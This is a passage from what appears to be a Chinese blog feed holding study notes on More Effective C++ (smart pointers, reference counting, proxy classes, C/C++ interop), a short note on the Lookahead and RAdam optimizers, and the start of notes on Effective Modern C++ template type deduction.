pointers 一个默认值nullptr，以避免“指针未获初始化”的头痛问题。某些 smart pointers可以删除它们所指的对象，比如当指向该对象的最后一个 smart pointer被销毁时。这是消除资源泄漏问题的一大进步。</li><li>复制和赋值（Copying and Assignment）。当一个 smart pointer被复制或涉及赋值动作时，你可以控制发生什么事。某些 smart pointer会希望在此时刻自动为其所指之物进行复制或赋值动作，也就是执行深复制（deepcopy）。另一些 smart pointer则可能只希望指针本身被复制或赋值就好。还有一些则根本不允许复制和赋值。不论你希望什么样的行为，smartpointer 都可以让你如愿。</li><li>解引（Dereferencing）。当 client 解引（取用）smart pointer所指之物时，你有权决定发生什么事情。例如你可以利用 smart pointer协助实现出条款 17 所说的 lazy fetching 策略。</li></ul><p>Smart pointer的构造行为通常明确易解：确定一个目标物（通常是利用smartpointer 的 constructor 参数），然后让 smart pointer 内部的 dumb pointer指向它。如果尚未决定目标物，就将内部指针设为nullptr，或是发出一个错误消息（可能是抛出 exception）。</p><p>Smart pointer 不要提供对 dumb pointer的隐式转换操作符，除非不得已。</p><p>在涉及继承相关的类型转换时，smart pointer 是做不到 dumb pointer所能做的一切的。此时，别使用 smart pointer ，而是 dumb pointer 。</p><h3><span id="条款-29referencecounting引用计数"><strong>条款 29：Referencecounting（引用计数）</strong></span></h3><p>通过 reference counting 可以建构出垃圾回收机制（garbagecollection）的一个简单形式。Reference counting的另一个发展动机则只是为了实现一种常识。如果许多对象有相同的值，将那个值存储多次是件愚蠢的事。最好是让所有等值对象共享一份实值就好。</p><h4><span id="copy-on-write">copy-on-write</span></h4><p>“和其他对象共享一份实值，直到我们必须对自己所拥有的那一份实值进行写动作，才进行复制”，这就是：copy-on-write（写时才复制）。</p><p>特别是在操作系统领域，各进程（processes）之间往往允许共享某些内存分页（memorypages），直到它们打算修改属于自己的那一分页，才进行复制。这是提升效率的一般化做法（也就是lazy evaluation，条款 17）。</p><h4><span id="实现">实现</span></h4><p>首先产生一个 base class RCObject，作为“reference-counted对象”之用。RCObject 组成为：</p><ul><li>“引用计数器”</li><li>增减计数值的函数</li><li>一个函数，用来将不再被使用（也就是其引用次数为0）的对象值销毁掉。</li><li>一个成员，用来追踪资源是否“可共享”，并提供查询其值、将该成员设为false等相关函数。在默认情况下为可共享状态。一旦某个对象被贴上“不可共享”标签，就没有办法再恢复其“可共享”的身份了。</li></ul><h4><span id="其他">其他</span></h4><p>简单地说，以下是使用 reference counting 改善效率的最适当时机：</p><ul><li>相对多数的对象共享相对少量的实值。这种共享行为通常是通过assignmentoperators 和 copy constructors。</li><li>对象实值的产生或销毁成本很高，或是资源占用内存很多。若实值（资源）可被多个对象共享，referencecounting 能带来较高收益。</li></ul><p>RCObject 的设计目的是用来作为有引用计数能力之“实值对象”的基类。</p><p>那些“实值对象”即实际的资源，设计 RCPtr smart pointer进行管理（RAII保证）。</p><p>RCObject、RCPtr 不应该被外界看到，应为私有成员，以限制其用途。</p><h3><span id="条款-30proxyclass代理类"><strong>条款 30：Proxyclass（代理类）</strong></span></h3><p>凡“用来代表（象征）其他对象”的对象，常被称为 proxyobjects（替身对象），而用以表现 proxy objects 者，我们称为 proxyclass。</p><p>当 class的身份从“与真实对象”移转到“与替身对象（proxies）”，往往会造成 class语义的改变，因为 proxy objects所展现的行为常常和真正对象的行为有些隐微差异。</p><p>在很多情况下，proxy对象可以完美替代实际对象。当它们可以工作时，意味着两者间的差异并不影响什么。</p><h4><span id="多维数组">多维数组</span></h4><p>优化二维数组的使用形式：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-class"><span class="hljs-title">class</span> <span class="hljs-title">Array2D</span> &#123;</span> <br><span class="hljs-keyword">public</span>: <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Array1D</span> &#123;</span> <br>    <span class="hljs-keyword">public</span>: <br>        T&amp; <span class="hljs-keyword">operator</span>[](<span class="hljs-keyword">int</span> index); <br>        <span class="hljs-keyword">const</span> T&amp; <span class="hljs-keyword">operator</span>[](<span class="hljs-keyword">int</span> index) <span class="hljs-keyword">const</span>; <br>        ...<br>&#125;; <br>    Array1D <span class="hljs-keyword">operator</span>[](<span class="hljs-keyword">int</span> index); <br>    <span class="hljs-keyword">const</span> Array1D <span class="hljs-keyword">operator</span>[](<span class="hljs-keyword">int</span> index) <span class="hljs-keyword">const</span>; <br>    ...<br>&#125;;<br><br><span class="hljs-comment">// Array1D 使得 data[][] 访问合法，否则只实现 Array2D 的话</span><br><span class="hljs-comment">// 势必只能 data(dim1, dim2) 这样调用</span><br><span class="hljs-function">Array2D&lt;<span class="hljs-keyword">float</span>&gt; <span class="hljs-title">data</span><span class="hljs-params">(<span class="hljs-number">10</span>, <span class="hljs-number">20</span>)</span></span>;<br>...<br><span class="hljs-built_in">cout</span> &lt;&lt; data[<span class="hljs-number">3</span>][<span class="hljs-number">6</span>];<br></code></pre></div></td></tr></table></figure><h4><span id="左值右值的区分">左值/右值的区分</span></h4><p>operator[]可以在两种不同的情况下调用：读一个字符或写一个字符。读是个右值操作；写是个左值操作。（这个名词来自于编译器，左值出现在赋值运算的左边，右值出现在赋值运算的右边。）</p><p>通常，将一个对象做左值使用意味着它可能被修改，做右值用意味着它不能够被修改。</p><p>虽然或许不可能知道 operator[]是在左值或右值情境下被调用，我们还是可以区分读和写。只要将处理动作推迟，直至知道operator[] 的返回结果将如何被使用为止。（lazy evaluation）</p><p>Proxy class 可是实现此 lazy evaluation。可以修改operator[]，令它返回字符串中字符的proxy，而不返回字符本身。然后等待，看看这个 proxy如何被运用。如果它被读，就将 operator[]的调用动作视为一个读取动作。如果它被写，就将 operator[]的调用视为一个写动作。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">String</span> &#123;</span> <br><span class="hljs-keyword">public</span>:<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CharProxy</span> &#123;</span><br><span class="hljs-keyword">public</span>: <br>        CharProxy(<span class="hljs-keyword">String</span>&amp; str, <span class="hljs-keyword">int</span> index);<br>CharProxy&amp; <span class="hljs-keyword">operator</span>=(<span class="hljs-keyword">const</span> CharProxy&amp; rhs); <br>        CharProxy&amp; <span class="hljs-keyword">operator</span>=(<span class="hljs-keyword">char</span> c); <br>        <span class="hljs-function"><span class="hljs-keyword">operator</span> <span class="hljs-title">char</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span></span>;<br><span class="hljs-keyword">private</span>: <br>        <span class="hljs-keyword">String</span>&amp; theString; <br>        <span class="hljs-keyword">int</span> charIndex;<br>    &#125;;<br>    <br>    <span class="hljs-keyword">const</span> CharProxy <span class="hljs-keyword">operator</span>[](<span class="hljs-keyword">int</span> index) <span class="hljs-keyword">const</span> &#123;<br><span class="hljs-keyword">return</span> CharProxy(<span class="hljs-keyword">const_cast</span>&lt;<span class="hljs-keyword">String</span>&amp;&gt;(*<span class="hljs-keyword">this</span>), index);<br>&#125; <span class="hljs-comment">// for const Strings</span><br>CharProxy <span class="hljs-keyword">operator</span>[](<span class="hljs-keyword">int</span> index) &#123;<br><span class="hljs-keyword">return</span> CharProxy(*<span class="hljs-keyword">this</span>, index); <br>    &#125; <span class="hljs-comment">// for non-const Strings</span><br>    ...<br><span class="hljs-keyword">friend</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CharProxy</span>;</span> <br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-comment">// Reference counting ptr</span><br>    RCPtr&lt;StringValue&gt; value;<br>&#125;;<br><br><span class="hljs-keyword">String</span>::CharProxy::CharProxy(<span class="hljs-keyword">String</span>&amp; str, <span class="hljs-keyword">int</span> index) : theString(str), charIndex(index) &#123;&#125;<br><br><span class="hljs-keyword">String</span>::<span class="hljs-function">CharProxy::<span class="hljs-keyword">operator</span> <span class="hljs-title">char</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span> </span>&#123;<br><span class="hljs-keyword">return</span> theString.value-&gt;data[charIndex];<br>&#125;<br><br><span class="hljs-keyword">String</span>::CharProxy::<span class="hljs-keyword">operator</span>=(<span class="hljs-keyword">const</span> CharProxy&amp; rhs) &#123;<br>    <span class="hljs-comment">// copy on write</span><br>    <span class="hljs-keyword">if</span> (theString.value-&gt;isShared()) &#123; <br>        theString.value = <span class="hljs-keyword">new</span> StringValue(theString.value-&gt;data);<br>    &#125;<br>    theString.value-&gt;data[charIndex] = rhs.theString.value-&gt;data[rhs.charIndex];<br><span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;<br>&#125;<br><br><span class="hljs-keyword">String</span>::CharProxy&amp; <span class="hljs-keyword">String</span>::CharProxy::<span class="hljs-keyword">operator</span>=(<span class="hljs-keyword">char</span> c) &#123;<br><span class="hljs-keyword">if</span> (theString.value-&gt;isShared()) &#123; <br>        theString.value = <span class="hljs-keyword">new</span> StringValue(theString.value-&gt;data);<br>&#125; <br>    theString.value-&gt;data[charIndex] = c; <br>    <span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">String</span> s1, s2;<br><br><span class="hljs-comment">// 表达式s1[5]返回的是一 CharProxy 对象。没有为这样的对象&lt;&lt;操作</span><br><span class="hljs-comment">// 在 CahrProxy 类内部申明了一个隐式转换到 char 的操作。</span><br><span class="hljs-comment">// 这个 CharProxy-to-char 的转换是代理对象作右值使用时的典型行为。</span><br><span class="hljs-built_in">cout</span> &lt;&lt; s1[<span class="hljs-number">5</span>];<br><br><span class="hljs-comment">// 表达式s2[5]返回的是一个 CharProxy 对象，作为赋值操作的目标。 </span><br><span class="hljs-comment">// 调用的是 CharProxy 类中的赋值操作。</span><br><span class="hljs-comment">// 在 CharProxy 的赋值操作中，被赋值的 CharProxy 对象是作左值使用的</span><br><span class="hljs-comment">// proxy 类扮演的字符是作左值使用的</span><br>s2[<span class="hljs-number">5</span>] = <span class="hljs-string">'x'</span>;<br><br><span class="hljs-comment">// 左边是一个左值，右边一个作右值</span><br>s1[<span class="hljs-number">3</span>] = s2[<span class="hljs-number">8</span>];<br></code></pre></div></td></tr></table></figure><h3><span id="条款31让函数根据一个以上的对象类型来决定如何虚化"><strong>条款31：让函数根据一个以上的对象类型来决定如何虚化</strong></span></h3><p>假设你必须以C++完成任务，也就是你必须自行想办法完成上述需求（常被称为double-dispatching）。此名称来自面向对象程序设计社区，在那个领域里，人们把一个“虚函数调用动作”称为一个“messagedispatch”（消息分派）。</p><p>因此某个函数调用如果根据两个参数而虚化（两个参数发生动态类型绑定），自然而然地就被称为“doubledispatch”。更广泛的情况（函数根据多个参数而虚化）则被称为 multipledispatch。</p><ul><li>虚函数+ RTTI（运行时期类型辨识），根据不同的 typeid()结果，进行条件判断实现不同处理逻辑。</li><li>只使用虚函数，在两个类型中，分别按照 single dispatch的方式处理，然后组合使用。比RTTI方法更安全。</li><li>自行仿真虚函数表格（Virtual Function Tables），略</li></ul><h2><span id="六-杂项讨论">六、杂项讨论</span></h2><h3><span id="条款32在未来时态下发展程序"><strong>条款32：在未来时态下发展程序</strong></span></h3><p>所谓在未来时态下设计程序，就是接受“事情总会改变”的事实，并准备应对方法。</p><p>也许程序库会加入新的函数，导致新的重载（overloading）发生，于是导致潜在的歧义。</p><p>也许继承体系会加入新的 class，致使今天的 derived class 成为明天的base class。</p><p>也许新的应用软件会出现，函数会在新的环境下被调用，而我们必须考虑那种情况下仍能正确执行任务。</p><p>程序的维护者通常都不是当初的开发者，所以设计和实现时应该注意到如何帮助其他人理解、修改、强化你的程序。</p><p>未来式思维只不过是加上一些额外的考虑：</p><ul><li><p>提供完整的class，即使某些部分目前用不到。当新的需求进来，你不太需要回头去修改那些class。</p></li><li><p>设计你的接口，让这些 class轻易地被正确运用，难以被错误运用。例如，面对那些“copying 和 assignment并不合理”的 class，请禁止那些动作的发生。</p></li><li><p>尽量使你的代码一般化（泛化），除非有不良的巨大后果。举个例子，如果你正在写一个算法，用于树状结构（tree）的来回遍历，请考虑将它一般化，以便能够处理任何种类的directed acyclic（非环状的）graph。</p></li><li><p>使用设计模式封装变化。</p></li></ul><h3><span id="条款33将非尾端类non~leaf-class设计为抽象类abstractclass"><strong>条款33：将非尾端类（non～leaf class）设计为抽象类（abstractclass）</strong></span></h3><p>将函数声明为纯虚函数，并非暗示它没有实现，而是意味着：</p><ul><li>目前这个 class 是抽象的。</li><li>任何继承此 class的具体类，都必须将该纯虚函数重新声明为一个正常的虚函数（也就是说，不可以再令它“=0”）。</li></ul><p>的确，大部分纯虚函数并没有实现码，但是 pure virtual destructors是个例外。它们必须被实现出来，因为只要有一个 derived classdestructor被调用，它们便会被调用。此外，它们通常执行一些有用的工作，如释放资源或记录运转消息等等。纯虚函数的实现或许并不常见，但对pure virtual destructors 而言，实现不仅是平常的事，甚至是必要的事。</p><p>一般性的法则是：继承体系中的 non-leaf（非尾端）类应该是抽象类。</p><h3><span id="条款34如何在同一个程序中结合-c和-c"><strong>条款34：如何在同一个程序中结合 C++和 C</strong></span></h3><p>有 4 件事情你需要考虑：namemangling（名称重整）、statics（静态对象）初始化、动态内存分配、数据结构的兼容性。</p><ul><li>Name Mangling（名称重整）</li></ul><p>Name mangling 是一种程序。通过它，你的C++编译器为程序内的每一个函数编出独一无二的名称。在 C语言中，此程序并无必要，因为你无法将函数名称重载（overload）；但是几乎所有的C++程序都有一些函数拥有相同的名称。</p><ul><li>Statics 的初始化</li></ul><p>许多代码会在 main之前和之后执行起来。更明确地说，static class对象、全局对象、namespace 内的对象以及文件范围（file scope）内的对象，其constructors 总是在 main 之前就获得执行。这个过程称为staticinitialization。同样道理，通过 static initialization产生出来的对象，其destructors 必须在 static destruction过程中被调用。static destruction 发生在 main 结束之后。</p><ul><li>动态内存分配</li></ul><p>动态内存分配的一般规则很简单：程序的 C++部分使用 new 和delete，程序的C 部分则使用 malloc（及其变种）和free。只要内存是以 new 分配而得，就以delete 删除。只要内存是以 malloc 分配而得，就以 free 释放。</p><ul><li>数据结构的兼容性</li></ul><p>从数据结构的观点来看，我们可以说：在 C 和C++之间对数据结构做双向交流，应该是安全的——前提是那些结构的定义式在 C和C++ 中都可编译。为 C++ struct加上非虚函数，可能不影响其兼容性；其他任何改变则几乎都会影响。</p><ul><li>准则</li></ul><p>如果你打算在同一个程序中混用 C++和 C，请记住以下几个简单守则：</p><ul><li>确定你的 C++和 C 编译器产出兼容的目标文件（object files）。</li><li>将双方都使用的函数声明为 extern ＂C＂。</li><li>如果可能，尽量在 C++ 中撰写 main。</li><li>总是以 delete 删除 new返回的内存；总是以 free 释放 malloc返回的内存。</li><li>将两个语言间的“数据结构传递”限制于 C 所能了解的形式。</li></ul><h3><span id="条款-35让自己习惯于标准c语言"><strong>条款 35：让自己习惯于标准C++语言</strong></span></h3><p>C++最重要的几项改变如下所示（时间在C++11之前）。</p><ul><li>增加了一些新的语言特性：RTTI、namespaces、bool、关键词mutable和explicit、enums 作为重载函数之自变量所引发的类型晋升转换，以及“在class定义区内直接为整数型（integral）conststatic class members设定初值”的能力。</li><li>扩充了 Templates 的弹性：允许 member templates 存在等。</li><li>强化了异常处理机制（Exception handling）：编译期间更严密地检验exception specifications等。</li><li>修改了内存分配例程：加入 operator new[] 和 operatordelete[]，内存未能分配成功时由 operator new/new[]抛出一个exception，在内存分配失败时返回 0。</li><li>增加了新的转型形式：static_cast，dynamic_cast，const_cast和reinterpret_cast。</li><li>语言规则更为优雅精练：重新定义虚函数时，其返回类型不再一定得与原定义完全吻合。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> Book </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>再看Lookahead</title>
      <link href="/posts/89ba64e7.html"/>
      <url>/posts/89ba64e7.html</url>
      
        <content type="html"><![CDATA[<h2><span id="lookahead">Lookahead</span></h2><p>优化器的本质目的： <span class="math display">\[\theta_{t+1}=\theta_{t}+dt*\nabla L(\theta)\]</span> 简单变化： <span class="math display">\[\frac{\theta_{t+1}-\theta_{t}}{dt}=\nabla L(\theta) \\\frac{\partial \theta}{\partial t}=\nabla L(\theta)\]</span> t 表示timestep，这个推导不严谨，但是这么写也有点道理。且先这么假设。</p><p>优化求解的过程，就是求解 <span class="math inline">\(\frac{\partial\theta}{\partial t} \rightarrow 0\)</span>的最优参数（局部最优）的过程，也就是对 <span class="math inline">\(\nabla L(\theta) \rightarrow 0\)</span>的优化。</p><p>Lookahead要的是啥？不仅要最优化的参数，我还要参数在损失函数空间中处于一个相对更稳定的区域。</p><p>怎么稳定？让优化器自己试试周围的情况，多更新几次。怎么实现？设计一个Function（过程）:<span class="math display">\[F(\theta)=\theta+\alpha \nabla L(\theta)\]</span> 同时，令： <span class="math display">\[\frac{\partial \theta}{\partial t} = F^k(\theta) - \theta \rightarrow 0\]</span> 要求 F 的 k 次复合函数变化之后，能满足以上条件。</p><p>此时发生了什么？看看，<span class="math inline">\(F(\theta)=\theta\)</span> 这种变换成立的时候， F的 k 次复合函数变化的结果还是 <span class="math inline">\(\theta\)</span>，完美满足条件。也几就是说，经过 k次 <span class="math inline">\(\nabla L(\theta)\)</span>的变化，参数会处于一个比较稳定的区域。</p><p>虽然有点简化了过程，但是Lookahead确实就是这么个思路。</p><h2><span id>。。。</span></h2><p>Lookahead这个算法搭配RAdam倒是见过几次了。感觉上，应该是不错的。</p><p>毕竟，RAdam相较于其它自适应学习率的优化器，对于步长的计算进行了优化。Lookahead同时选择理论上好像更好的步长，比较地NICE。</p><blockquote><p>RAdam 主要针对 Adam在训练初始阶段，二阶动量在不同batch输入时可能面临方差过大的情况，导致训练不稳定。Bias-correction并不能解决这个问题，也不是用来解决这个问题的。</p><p>所以 RAdam 设计了参数 <span class="math inline">\(\rho_t,\rho_{\infty}\)</span> 。 <span class="math inline">\(\rho_{\infty}\)</span> 很大，而 <span class="math inline">\(\rho_t\)</span> 逐渐增大趋于 <span class="math inline">\(\rho_{\infty}\)</span>。</p><p>根据 <span class="math inline">\(\rho_t\)</span>的大小，调整参数更新策略。先是 momentum 方式，只考虑一阶动量；当 <span class="math inline">\(\rho_t\)</span> 达到一定大小，再进行 RAdam方式更新。</p><p>RAdam 方式相较于 Adam，多了一个随time step逐渐增大的参数 <span class="math inline">\(r_t\)</span>和学习率一起作用于权重参数的更新过程。</p><p>甚至有点warm-up的味道了。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> DL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> optimizer </tag>
            
            <tag> lookahead </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Effective Modern Cpp</title>
      <link href="/posts/b3d88a54.html"/>
      <url>/posts/b3d88a54.html</url>
      
        <content type="html"><![CDATA[<p>为什么<code>const</code>成员函数应当线程安全？怎样使用<code>std::unique_ptr</code>实现Pimpl惯用法？为何要避免<em>lambda</em>表达式用默认捕获模式？<code>std::atomic</code>与<code>volatile</code>的区别是什么？</p><h2><span id="基础简介">基础简介</span></h2><p>C++中的许多东西都可被声明和定义。<strong>声明</strong>（<em>declarations</em>）引入名字和类型，并不给出比如存放在哪或者怎样实现等的细节：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">extern</span> <span class="hljs-keyword">int</span> x;                       <span class="hljs-comment">//对象声明</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Widget</span>;</span>                       <span class="hljs-comment">//类声明</span><br><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-keyword">const</span> Widget&amp; w)</span></span>;         <span class="hljs-comment">//函数声明</span><br><br><span class="hljs-keyword">enum</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Color</span>;</span>                   <span class="hljs-comment">//限域enum声明</span><br></code></pre></div></td></tr></table></figure><p><strong>定义</strong>（<em>definitions</em>）提供存储位置或者实现细节：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">int</span> x;                              <span class="hljs-comment">//对象定义</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Widget</span> &#123;</span>                      <span class="hljs-comment">//类定义</span><br>    …<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-keyword">const</span> Widget&amp; w)</span></span><br><span class="hljs-function"></span>&#123; <span class="hljs-keyword">return</span> w.size() &lt; <span class="hljs-number">10</span>; &#125;           <span class="hljs-comment">//函数定义</span><br><br><span class="hljs-keyword">enum</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Color</span></span><br><span class="hljs-class">&#123;</span> Yellow, Red, Blue &#125;;              <span class="hljs-comment">//限域enum定义</span><br></code></pre></div></td></tr></table></figure><p>定义也有资格称为声明。</p><p>定义一个函数的<strong>签名</strong>（<em>signature</em>）为它声明的一部分，这个声明指定了形参类型和返回类型。函数名和形参名不是签名的一部分。在上面的例子中，<code>func</code>的签名是<code>bool(const Widget&amp;)</code>。函数声明中除了形参类型和返回类型之外的元素（比如<code>noexcept</code>或者<code>constexpr</code>，如果存在的话）都被排除在外。</p><p>另外<code>std::auto_ptr</code>在C++11中被废弃，因为<code>std::unique_ptr</code>可以做同样的工作，而且只会做的更好。</p><p>如果一个操作的结果有<strong>未定义的行为</strong>（<em>undefinedbehavior</em>）。这意味着运行时表现是不可预测的。比如，在<code>std::vector</code>范围外使用方括号（“<code>[]</code>”），解引用未初始化的迭代器，或者数据竞争（即有两个或以上线程，至少一个是writer，同时访问相同的内存位置）。</p><p>还有，智能指针通常重载指针解引用运算符（<code>operator-&gt;</code>和<code>operator*</code>），但<code>std::weak_ptr</code>是个例外。</p><h1><span id="1-类型推导">1 类型推导</span></h1><p>C++11修改了一些类型推导规则并增加了两套规则，一套用于<code>auto</code>，一套用于<code>decltype</code>。C++14扩展了<code>auto</code>和<code>decltype</code>可能使用的范围。</p><h2><span id="条款1理解模板类型推导">条款1：理解模板类型推导</span></h2><p>C++最重要最吸引人的特性<code>auto</code>是建立在模板类型推导的基础上的。</p><p>考虑像这样一个函数模板：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">f</span><span class="hljs-params">(ParamType param)</span></span>;<br></code></pre></div></td></tr></table></figure><p>更具体一点是：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">f</span><span class="hljs-params">(<span class="hljs-keyword">const</span> T&amp; param)</span></span>;         <span class="hljs-comment">//ParamType是const T&amp;</span><br></code></pre></div></td></tr></table></figure><p>编译器对 f函数的参数进行两个类型推导：一个是针对<code>T</code>的，另一个是针对<code>ParamType</code>的。这两个类型通常是不同的，因为<code>ParamType</code>包含一些修饰，比如<code>const</code>和引用修饰符。</p><p>然后这样进行调用：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">int</span> x = <span class="hljs-number">0</span>;<br>f(x);                           <span class="hljs-comment">//用一个int类型的变量调用f</span><br></code></pre></div></td></tr></table></figure><p><code>T</code>被推导为<code>int</code>，<code>ParamType</code>却被推导为<code>const int&amp;</code>。</p><p><code>T</code>的类型推导不仅取决于<code>expr</code>的类型，也取决于<code>ParamType</code>的类型。有三种情况：</p><ul><li><code>ParamType</code>是一个指针或引用，但不是通用引用（参见Item24，它不同于左值引用和右值引用）</li><li><code>ParamType</code>是一个通用引用</li><li><code>ParamType</code>既不是指针也不是引用</li></ul><h3><span id="paramtype是一个指针或引用但不是通用引用"><code>ParamType</code>是一个指针或引用，但不是通用引用</span></h3><p><code>f(expr)</code> 的类型推导会这样进行：</p><ol type="1"><li>如果<code>expr</code>的类型是一个引用，忽略引用部分</li><li>然后<code>expr</code>的类型与<code>ParamType</code>进行模式匹配来决定<code>T</code></li></ol><p>如果这是我们的模板，</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">f</span><span class="hljs-params">(T&amp; param)</span></span>;               <span class="hljs-comment">//param是一个引用</span><br></code></pre></div></td></tr></table></figure><p>我们声明这些变量，</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">int</span> x=<span class="hljs-number">27</span>;                       <span class="hljs-comment">//x是int</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> cx=x;                 <span class="hljs-comment">//cx是const int</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span>&amp; rx=x;                <span class="hljs-comment">//rx是指向作为const int的x的引用</span><br></code></pre></div></td></tr></table></figure><p>在不同的调用中，对<code>param</code>和<code>T</code>推导的类型会是这样：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">f(x);                           <span class="hljs-comment">//T是int，param的类型是int&amp;</span><br>f(cx);                          <span class="hljs-comment">//T是const int，param的类型是const int&amp;</span><br>f(rx);                          <span class="hljs-comment">//T是const int，param的类型是const int&amp;</span><br></code></pre></div></td></tr></table></figure><p>即使<code>rx</code>的类型是一个引用，<code>T</code>也会被推导为一个非引用，这是因为<code>rx</code>的引用性（reference-ness）在类型推导中会被忽略。</p><p>当<code>param</code>是reference-to-<code>const</code>，<code>const</code>不再被推导为<code>T</code>的一部分：</p><figure class="highlight 